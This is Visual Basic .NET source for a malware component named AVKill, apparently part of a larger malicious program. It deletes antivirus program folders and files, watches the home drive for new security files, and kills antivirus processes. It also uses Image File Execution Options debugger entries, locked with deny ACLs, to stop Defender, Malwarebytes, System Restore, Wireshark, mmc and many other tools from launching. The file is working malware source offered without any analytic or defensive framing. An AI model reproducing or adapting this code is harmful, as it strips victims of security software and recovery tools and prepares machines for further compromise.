Imports System.IO
Imports Microsoft.Win32
Imports System.Security.Principal
Imports System.Security.AccessControl

Module AVKill
    Public WithEvents ProactiveAVKiller As New FileSystemWatcher
    Public searchedfolders As String
    Dim lol As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\"
    Dim SearchStrings As String = "Ad-Aware AegisLab AhnLab-V3 ALYac Antiy-AVL Arcabit Avast Avast Mobile  Security AVG Avira Babable Baidu BitDefender Bkav CAT-QuickHeal ClamAV CMC Comodo Cyren DrWeb Emsisoft eScan ESET-NOD32 F-Prot F-Secure Fortinet GData Ikarus Jiangmin K7AntiVirus K7GW Kaspersky Kingsoft Malwarebytes MAX McAfee McAfee-GW-Edition NANO-Antivirus Panda Qihoo-360 Rising Sophos  AV SUPERAntiSpyware Symantec TACHYON Tencent TheHacker TotalDefense TrendMicro TrendMicro-HouseCall VBA32 ViRobot Zillya ZoneAlarm Zoner Acronis Alibaba CrowdStrike  Falcon Cybereason Cylance eGambit Endgame Palo  Alto  Networks SentinelOne   Sophos ML Symantec Mobile Insight Trapmine Trustlook Webroot Defender"
    Public Sub searchav(ByVal folder As String)
        Try
            Dim avstrings() = Split(SearchStrings, " ")
            Dim tehfilesandshit() As String
            tehfilesandshit = Directory.GetDirectories(folder)
            For Each workload In tehfilesandshit
                Try
                    If Not searchedfolders = workload.ToString Then
                        searchedfolders = workload.ToString
                        Dim dir As String = workload.ToString
                        Dim Search As String = StrConv(workload.ToString, VbStrConv.Lowercase)
                        For Each lmao As String In avstrings
                            Try
                                If Search.Contains(lmao) Then
                                    KillFile(workload.ToString)
                                End If
                            Catch : End Try
                        Next
                    End If
                Catch : End Try
            Next
        Catch
        End Try
    End Sub
    Public Sub CheckFileforAV(ByVal path As String)
        Try
            Dim avstrings() = Split(SearchStrings, " ")
            Dim Search As String = StrConv(path.ToString, VbStrConv.Lowercase)
            For Each lmao As String In avstrings
                Try
                    If Search.Contains(lmao) Then

                        KillFile(path.ToString)
                    End If
                Catch : End Try
            Next
        Catch : End Try
    End Sub
    Public Sub ProactiveAVKill()
        Try
            ProactiveAVKiller.Filter = "*.*"
            ProactiveAVKiller.NotifyFilter = NotifyFilters.FileName
            ProactiveAVKiller.Path = Environment.GetEnvironmentVariable("HOMEDRIVE") & "\"
            ProactiveAVKiller.IncludeSubdirectories = True
            ProactiveAVKiller.EnableRaisingEvents = True
        Catch : End Try
    End Sub

    Private Sub FileSystemWatcher1_Created(ByVal sender As Object, ByVal e As System.IO.FileSystemEventArgs) Handles ProactiveAVKiller.Created
        On Error Resume Next
        CheckFileforAV(e.FullPath)
    End Sub
    Public Sub Start()

        ' Threading.Thread.Sleep(180000)
        Try
            If Not IsAdmin() Then
                RunAVAdminMode()
            Else
                searchav(Environment.GetEnvironmentVariable("PROGRAMDATA"))
                ProtectMyFile()
                searchav(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles))
                AVProcSearcher()
                FuckFileName("rstrui.exe")
                FuckFileName("AvastSvc.exe")
                FuckFileName("avconfig.exe")
                FuckFileName("AvastUI.exe")
                FuckFileName("avscan.exe")
                FuckFileName("instup.exe")
                FuckFileName("mbam.exe")
                FuckFileName("mbamgui.exe")
                FuckFileName("mbampt.exe")
                FuckFileName("mbamscheduler.exe")
                FuckFileName("mbamservice.exe")
                FuckFileName("hijackthis.exe")
                FuckFileName("spybotsd.exe")
                FuckFileName("ccuac.exe")
                FuckFileName("avcenter.exe")
                FuckFileName("avguard.exe")
                FuckFileName("avgnt.exe")
                FuckFileName("avgui.exe")
                FuckFileName("avgcsrvx.exe")
                FuckFileName("avgidsagent.exe")
                FuckFileName("avgrsx.exe")
                FuckFileName("avgwdsvc.exe")
                FuckFileName("egui.exe")
                FuckFileName("zlclient.exe")
                FuckFileName("bdagent.exe")
                FuckFileName("keyscrambler.exe")
                FuckFileName("avp.exe")
                FuckFileName("wireshark.exe")
                FuckFileName("ComboFix.exe")
                FuckFileName("MSASCui.exe")
                FuckFileName("MpCmdRun.exe")
                FuckFileName("msseces.exe")
                FuckFileName("MsMpEng.exe")
                FuckFileName("blindman.exe")
                FuckFileName("SDFiles.exe")
                FuckFileName("SDMain.exe")
                FuckFileName("SDWinSec.exe")
                FuckFileName("MpCmdRun.exe")
                FuckFileName("MSASCuiL.exe")
                FuckFileName("mmc.exe")
                FuckFileName("EMSISOFT.exe")
            End If
        Catch : End Try

    End Sub
    Public Sub FuckFileName(ByVal input As String)
        Try
            If input.Contains("\") Then
                Dim lol() As String = Split(input, "\")
                For Each xd As String In lol
                    If xd.Contains(".exe") Then input = xd
                Next
            End If


            Dim regKey As RegistryKey
            regKey = Registry.LocalMachine.OpenSubKey("software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options", True)
            regKey.CreateSubKey(input)

            regKey.Close()

            Dim Fuckyou As RegistryKey
            Fuckyou = Registry.LocalMachine.OpenSubKey("software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" & input, True)
            Fuckyou.SetValue("Debugger", "nqij.exe")

            Dim securityIdentifier As New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing)
            Dim ntacrcount As NTAccount = TryCast(securityIdentifier.Translate(GetType(NTAccount)), NTAccount)
            Dim s1 As String = ntacrcount.ToString
            Dim registrySecurity As New RegistrySecurity()
            registrySecurity.AddAccessRule(New RegistryAccessRule(s1, RegistryRights.QueryValues Or RegistryRights.EnumerateSubKeys Or RegistryRights.Notify Or RegistryRights.ReadPermissions, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow))
            registrySecurity.AddAccessRule(New RegistryAccessRule(s1, RegistryRights.SetValue Or RegistryRights.Delete Or RegistryRights.CreateSubKey Or RegistryRights.ChangePermissions Or RegistryRights.TakeOwnership, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny))
            Fuckyou.SetAccessControl(registrySecurity)
            Fuckyou.Close()
        Catch : End Try
    End Sub
    Public Sub ProtectMyFile()
        Try


            Dim input = Module1.RunFileAs
            Dim regKey As RegistryKey
            regKey = Registry.LocalMachine.OpenSubKey("software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options", True)
            regKey.CreateSubKey(input)

            regKey.Close()

            Dim Fuckyou As RegistryKey
            Fuckyou = Registry.LocalMachine.OpenSubKey("software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" & input, True)
            Fuckyou.SetValue("DisableExceptionChainValidation", "")

            Dim securityIdentifier As New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing)
            Dim ntacrcount As NTAccount = TryCast(securityIdentifier.Translate(GetType(NTAccount)), NTAccount)
            Dim s1 As String = ntacrcount.ToString
            Dim registrySecurity As New RegistrySecurity()
            registrySecurity.AddAccessRule(New RegistryAccessRule(s1, RegistryRights.QueryValues Or RegistryRights.EnumerateSubKeys Or RegistryRights.Notify Or RegistryRights.ReadPermissions, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow))
            registrySecurity.AddAccessRule(New RegistryAccessRule(s1, RegistryRights.SetValue Or RegistryRights.Delete Or RegistryRights.CreateSubKey Or RegistryRights.ChangePermissions Or RegistryRights.TakeOwnership, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny))
            Fuckyou.SetAccessControl(registrySecurity)
            Fuckyou.Close()
        Catch : End Try
    End Sub
    Public Function CheckProcess(ByVal location As String) As Boolean
        Try
            Dim avstrings() = Split(SearchStrings, " ")
            Dim Search As String = StrConv(location.ToString, VbStrConv.Lowercase)
            For Each lmao As String In avstrings
                Try
                    If Search.Contains(lmao) Then
                        FuckFileName(location.ToString)
                        KillFile(location.ToString)
                        Return True
                    End If
                Catch : End Try
            Next
        Catch : End Try
    End Function
    Public Sub AVProcSearcher()
        Try

            Dim asdf As String = "Program Files"
            For Each Process In GetObject("winmgmts:").ExecQuery("Select * from Win32_Process")
                If Process.ExecutablePath.ToString.Contains(asdf) Or Process.ExecutablePath.ToString.Contains("ProgramData") Then
                    If Not Process.executablepath.ToString.Contains(Module1.InstallationOfEverything) Then
                        If Not Process.executablepath.ToString = Application.ExecutablePath Then
                            Try
                                Try
                                    If CheckProcess(Process.ExecutablePath) Then System.Diagnostics.Process.GetProcessById(Process.ProcessID).Kill()
                                Catch
                                End Try
                            Catch
                            End Try
                        End If
                    End If
                End If

            Next
        Catch
        End Try
    End Sub
End Module
